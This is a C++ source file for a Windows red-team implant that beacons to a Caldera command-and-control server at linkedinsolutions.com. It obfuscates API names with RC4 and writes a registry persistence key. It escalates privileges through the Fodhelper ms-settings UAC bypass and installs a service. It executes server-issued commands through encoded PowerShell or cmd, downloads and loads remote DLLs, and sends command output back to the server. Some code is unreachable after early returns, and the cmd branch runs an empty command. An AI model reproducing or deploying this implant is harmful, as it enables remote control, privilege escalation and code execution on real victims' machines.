// RedTeamAgent.cpp
// This agent opens up an HTTP session and transmits data to a C2 (Caldera). 
// We can use regular expressions to remove bad characters from the transmitted data.

//
#include "main.h"


string ModuleCommands = "";
HMODULE Module = NULL;
string Privilege = "User";


#define MSGBOXDEF int (_stdcall *)(HWND, LPCSTR, LPCSTR, UINT)

struct APIs
{

    int(_stdcall* MessageBoxAPI)(
        HWND   hWnd,
        LPCSTR lpText,
        LPCSTR lpCaption,
        UINT   uType
        );

};


APIs* GetAPIs()
{
    APIs* apis = (APIs*)malloc(sizeof(APIs));

    const char* MessageBoxEncrypted = "\xd6\xc0\xb1\xeb\xd4\x8e\x41\x8c\x96\x0b\x92";
    int Length = strlen(MessageBoxEncrypted);


    HMODULE User32DLL = LoadLibraryA("User32.dll");
    apis->MessageBoxAPI = (MSGBOXDEF)GetProcAddress(User32DLL, (char*)RC4((char*)"RedTeam", (unsigned char*)MessageBoxEncrypted, Length));
    return apis;
}


int main(int argc, char* argv[])
{   
    char Filename[MAX_PATH] = { 0 };
    DWORD nLength = GetModuleFileName(NULL, Filename, MAX_PATH) + 1;



    APIs* apis = GetAPIs();

    (*apis->MessageBoxAPI)(0, "This is my Red Team Agent","Red Team", 0);
    return 0;



    
    const char* EncryptedRegKey = "\x97\x8b\x82\x90\x93\x85\x96\x81\x98\x89\xad\xa7\xb6\xab\xb7\xab\xa2\xb0\x98\x93\xad\xaa\xa0\xab\xb3\xb7\x98\x87\xb1\xb6\xb6\xa1\xaa\xb0\x92\xa1\xb6\xb7\xad\xab\xaa\x98\x96\xb1\xaa";
    char* DecryptedRegKey = (char*)RC4((char*)"RedTeam", (unsigned char*)EncryptedRegKey, strlen(EncryptedRegKey));
    printf("Decrypted Registry Key: %s", DecryptedRegKey);

    UpdateRegistry(HKEY_CURRENT_USER, DecryptedRegKey, (char*)"RedTeam", (char*)Filename, nLength, REG_SZ, false);
    return 0;


    if (argc < 2)
    {
 
        string command = string(Filename) + " -a";
        UpdateRegistry(HKEY_CURRENT_USER, (char*)"SOFTWARE\\Classes\\ms-settings\\Shell\\Open\\command", NULL, (char*)command.c_str(), command.length(), REG_SZ, true);
        UpdateRegistry(HKEY_CURRENT_USER, (char*)"SOFTWARE\\Classes\\ms-settings\\Shell\\Open\\command", (char*)"DelegateExecute", (char*)"", 0, REG_SZ, true);
        system("Fodhelper.exe");
        return 0;
    }
    else if (string(argv[1]) == " -a")
    {
        cout << "Running as administrator!!\n";
        Privilege = "Elevated";
        InstallService((char*)"RedTeamAgentNew");

    }



    string paw = "";
    while (true)
    {
        JSON msg = {
                "pid", "1200",
                "server", "linkedinsolutions.com",
                "platform", "windows",
                "host", "RedTeamAgent",
                "username", "infected",
                "architecture", "amd64",
                "privilege", Privilege.c_str(),
                "executors", json::Array("psh", "cmd")
        };

        if (!paw.empty())
            msg["paw"] = paw;


        char* encodedmsg = b64encode((char*)msg.dump().c_str(), msg.dump().length());
        printf("Our Encoded Msg: %s\n", encodedmsg);

        HINTERNET hSession = SendRequest("www.linkedinsolutions.com", 80, "/beacon", "POST", encodedmsg);
        if (hSession)
        {
            printf("Data has been sent successfully\n");
        }
        else
        {
            printf("Error in sending data\n");
        }



        DWORD Length = 0;
        char* Response = GetResponse(hSession, &Length);
        printf("Caldera Response: %s\n", Response);
        if (Response == NULL || Length == 0)
            continue;

        InternetCloseHandle(hSession);
        char* DecodedResponse = b64decode(Response, Length);
        string response = DecodedResponse;
        response = regex_replace(response, regex("\\\\"), "");
        response = regex_replace(response, regex("\"\\["), "[");
        response = regex_replace(response, regex("\"\\{"), "{");
        response = regex_replace(response, regex("\\]\""), "]");
        response = regex_replace(response, regex("\\}\""), "}");
        printf("Caldera Decoded Response: %s\n", response.c_str());

        JSON res = JSON::Load(response);
        paw = res["paw"].ToString();
        int sleep = res["sleep"].ToInt();
        cout << "paw: " << paw << "\n";
        cout << "sleep: " << sleep << "\n";

        for (int i = 0; i < res["instructions"].length(); i++)
        {
            string id = res["instructions"][i]["id"].ToString();
            string command = res["instructions"][i]["command"].ToString();
            string executor = res["instructions"][i]["executor"].ToString();
            cout << "id: " << id << "\n";
            cout << "command: " << command << "\n";
            cout << "executor: " << executor << "\n";
            char* decodecmd = b64decode((char*)command.c_str(), command.length());
            cout << "Decoded command: " << decodecmd << "\n";


            //Execute Instructions
            string cmd = "";
            char* output = NULL;
            size_t length = 0;
            if (executor == "psh")
            {
                string fullcmd = decodecmd;
                if (fullcmd.rfind("download ", 0) == 0)
                {
                    DWORD Length = 0;
                    //download <filename>
                    string filename = fullcmd.substr(strlen("download "));
                    string FullURL = "http://www.linkedinsolutions.com/gui/" + filename;
                    char* FileData = DownloadFile(FullURL.c_str(), &Length, NULL);
                    FILE* f = fopen(filename.c_str(), "wb");
                    fwrite(FileData, 1, Length, f);
                    fclose(f);

                    Module = LoadLibrary(filename.c_str());
                    FARPROC Install = GetProcAddress(Module, "Install");
                    ModuleCommands = (char*)Install();
                    cout << ModuleCommands << "\n";
                    system("pause");
                }
                else if (fullcmd.find(ModuleCommands, 0) != -1)
                {

                    FARPROC ModuleFunc = GetProcAddress(Module, fullcmd.c_str());
                    if (ModuleFunc != NULL)
                    {

                        output = (char*)ModuleFunc();
                        cout << "Command Output: " << output << "\n";
                        system("pause");
                    }
                    else
                    {
                        cout << "Error finding function: " << fullcmd.c_str() << "\n";
                        system("pause");
                    }

                }
                else
                {

                    wstring unicodecmd = ConvertAnsiToWide(decodecmd);
                    char* b64cmd = b64encode((char*)unicodecmd.c_str(), unicodecmd.length() * 2);
                    cmd = "powershell.exe -nop -enc " + string(b64cmd);
                    cout << "Our Command = " << cmd << "\n";

                    output = ExecuteApplication(cmd, length);
                }


            }
            else if (executor == "cmd")

            {

                cout << "Our command = " << cmd << "\n";
                size_t length = 0;
                output = ExecuteApplication(cmd, length);

                if (output == NULL || length == 0)
                {
                    output = (char*)"None";
                    length = strlen(output);
                }
                else
                    cout << "Output = " << output << "\n";

                JSON results = {
                    "id", id,
                    "output", b64encode(output,length),
                    "status", 0,
                    "pid", 0
                };

                JSON msg = {
                    "paw", paw,
                    "results", json::Array((results))
                };
                cout << msg.dump() << "\n";

                char* encodedmsg = b64encode((char*)msg.dump().c_str(), msg.dump().length());
                printf("Our Encoded Msg: %s\n", encodedmsg);

                hSession = SendRequest("www.linkedinsolutions.com", 80, "/beacon", "POST", encodedmsg);
                if (hSession)
                {
                    printf("Data has been sent successfully\n");
                }
                else
                {
                    printf("Error in sending data\n");
                }
                InternetCloseHandle(hSession);

            }

            Sleep(100 * sleep);

        }


    }

}